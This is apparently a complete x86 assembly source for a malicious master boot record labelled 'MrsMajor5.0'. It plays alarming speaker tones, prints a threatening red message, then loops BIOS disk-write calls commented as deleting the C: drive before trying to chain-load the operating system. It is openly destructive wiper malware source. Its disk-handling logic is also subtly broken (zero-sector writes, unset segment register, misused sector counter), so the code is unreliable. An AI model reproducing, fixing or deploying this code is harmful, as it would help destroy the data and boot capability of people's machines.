BITS 16
ORG 0x7C00

start:
    ; Boot drive is set to the first hard disk
    mov dl, 0x80            ; Set boot drive to the first hard disk (0x80)
    
    ; Play some scary sounds before deletion and message display
    call scary_sounds

    ; Display message in red
    mov ah, 0x0E            ; Teletype output function (int 10h)
    mov bl, 0x0C            ; Set text color to red (0x0C)
    mov al, 'M'             ; Start writing the message
    call print_char
    mov al, 'r'
    call print_char
    mov al, 's'
    call print_char
    mov al, 'M'
    call print_char
    mov al, 'a'
    call print_char
    mov al, 'j'
    call print_char
    mov al, 'o'
    call print_char
    mov al, 'r'
    call print_char
    mov al, '5'
    call print_char
    mov al, '.'
    call print_char
    mov al, '0'
    call print_char
    mov al, ' '
    call print_char
    mov al, 'N'
    call print_char
    mov al, 'O'
    call print_char
    mov al, 'W'
    call print_char
    mov al, ' '
    call print_char
    mov al, 'I'
    call print_char
    mov al, 'N'
    call print_char
    mov al, ' '
    call print_char
    mov al, 'Y'
    call print_char
    mov al, 'O'
    call print_char
    mov al, 'U'
    call print_char
    mov al, 'R'
    call print_char
    mov al, ' '
    call print_char
    mov al, 'N'
    call print_char
    mov al, 'I'
    call print_char
    mov al, 'G'
    call print_char
    mov al, 'H'
    call print_char
    mov al, 'T'
    call print_char
    mov al, 'M'
    call print_char
    mov al, 'A'
    call print_char
    mov al, 'R'
    call print_char
    mov al, 'E'
    call print_char
    mov al, 'S'
    call print_char
    mov al, '!'
    call print_char

    ; Begin deleting the C:\ drive (starting from sector 2)
    mov cx, 0x02            ; Start at sector 2 (sector 1 is the boot sector)
    mov dh, 0x00            ; Head 0
    mov ch, 0x00            ; Cylinder 0
    mov bx, 0x0000          ; Clear BX for zeroing out memory

delete_loop:
    mov ah, 0x03            ; BIOS disk write function (int 13h)
    xor al, al              ; Set AL to 0 to write 0 bytes (effectively erasing)
    int 0x13                ; Interrupt call to erase sector
    jc boot_fail            ; If write fails, show an error message
    inc cx                  ; Move to the next sector
    cmp cx, 0xFFFF          ; Continue until we erase many sectors
    jne delete_loop

    ; Chain-load the OS bootloader from the first partition
    mov dl, 0x80            ; Set the boot drive to the first hard disk
    mov bx, 0x7E00          ; Load the boot sector of the first partition at 0x7E00
    mov es, bx

    ; Read the first sector of the active partition (where the bootloader is)
    mov ah, 0x02            ; BIOS disk read function
    mov al, 1               ; Read 1 sector
    mov ch, 0               ; Cylinder 0
    mov cl, 2               ; Sector 2 (active partition bootloader)
    mov dh, 0               ; Head 0
    int 0x13                ; BIOS interrupt to read sector

    jc boot_fail            ; Jump to failure if disk read fails

    jmp 0x7E00:0x0000       ; Jump to the loaded boot sector (OS bootloader)

boot_fail:
    ; If the bootloader read fails, show an error message
    mov al, 'B'
    call print_char
    mov al, 'o'
    call print_char
    mov al, 'o'
    call print_char
    mov al, 't'
    call print_char
    mov al, ' '
    call print_char
    mov al, 'f'
    call print_char
    mov al, 'a'
    call print_char
    mov al, 'i'
    call print_char
    mov al, 'l'
    call print_char
    mov al, 'e'
    call print_char
    mov al, 'd'
    call print_char
    jmp $

scary_sounds:
    ; Generate low-pitched scary sound
    mov al, 0xB6            ; Set up the system speaker (control byte for PIT channel 2)
    out 0x43, al
    mov ax, 0x0E00          ; Low frequency tone (value in AX determines frequency)
    out 0x42, al            ; Send low byte to channel 2
    mov al, ah
    out 0x42, al            ; Send high byte
    in al, 0x61             ; Read system speaker control
    or al, 3                ; Turn on speaker
    out 0x61, al            ; Activate speaker
    call delay              ; Delay for a bit to hold the sound
    and al, 0xFC            ; Turn off speaker
    out 0x61, al

    ; Generate high-pitched scary sound
    mov al, 0xB6            ; Set up system speaker again
    out 0x43, al
    mov ax, 0x0200          ; High frequency tone
    out 0x42, al            ; Send low byte to channel 2
    mov al, ah
    out 0x42, al            ; Send high byte
    in al, 0x61             ; Read system speaker control
    or al, 3                ; Turn on speaker
    out 0x61, al            ; Activate speaker
    call delay              ; Delay for a bit
    and al, 0xFC            ; Turn off speaker
    out 0x61, al

    ret

delay:
    ; Simple delay loop for holding sound
    mov cx, 0xFFFF
delay_loop:
    dec cx
    jnz delay_loop
    ret

print_char:
    mov ah, 0x0E           ; Function to print a character
    int 0x10               ; BIOS interrupt 0x10
    ret

times 510-($-$$) db 0       ; Fill the remaining space up to 510 bytes
dw 0xAA55                   ; MBR signature (boot indicator)
